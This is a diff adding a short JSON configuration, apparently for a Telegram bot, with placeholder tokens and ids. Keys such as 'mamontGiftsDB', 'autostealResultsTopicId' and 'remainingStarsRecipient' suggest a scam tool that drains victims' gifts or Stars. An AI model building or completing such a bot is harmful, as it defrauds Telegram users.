@@ -1,0 +1,18 @@
+{
+  "botToken": "7",
+  "webUrl": "https://",
+  "recipientUsername": "username",
+  "remainingStarsRecipient": "7",
+  "apiId": 2,
+  "photourl": "https://",
+  "apiHash": "1",
+  "marketWebAppUrl": "https://",
+  "mamontGiftsDB": "mamont-gifts.json",
+  "adminId": 7,
+  "logGroupId": -1,
+  "logTopicId": 3,
+  "autostealResultsTopicId": 4,
+  "BOT_TOKEN": "7",
+  "starsChannelId": -1,
+  "starsMessageId": -1
+}
